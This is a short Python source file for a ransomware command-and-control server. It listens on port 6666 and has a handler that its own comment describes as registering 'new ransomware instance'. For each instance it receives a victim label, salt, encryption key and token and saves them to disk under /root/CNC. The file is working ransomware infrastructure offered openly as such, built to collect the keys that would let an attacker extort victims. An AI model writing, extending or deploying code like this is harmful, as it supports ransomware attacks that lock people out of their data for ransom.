import base64
from http.server import HTTPServer
import os
from pathlib import Path
import logging

from cncbase import CNCBase

class CNC(CNCBase):
    ROOT_PATH = "/root/CNC"

    def save_b64(self, token:str, data:str, filename:str):
        # helper
        # token and data are base64 fields

        bin_data = base64.b64decode(data)
        path = os.path.join(CNC.ROOT_PATH, token, filename)
        with open(path, "wb") as f:
            f.write(bin_data)

    def post_new(self, path:str, params:dict, body:dict) -> dict:
        # used to register new ransomware instance
        self._log.debug(path)
        self._log.debug(params)
        self._log.debug(body)
        label = params['label']
        salt = body['salt']
        key = body['key']
        token = body['token']
        new_path = f"{CNC.ROOT_PATH}/{label}"

        if not Path(new_path).exists():
            Path(new_path).mkdir(parents=True, exist_ok=True)
        self.save_b64(label, salt, 'salt.bin')
        self.save_b64(label, key, 'key.bin')
        self.save_b64(label, token, 'token.bin')

        return {"status":"OK"}

if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    httpd = HTTPServer(('0.0.0.0', 6666), CNC)
    httpd.serve_forever()
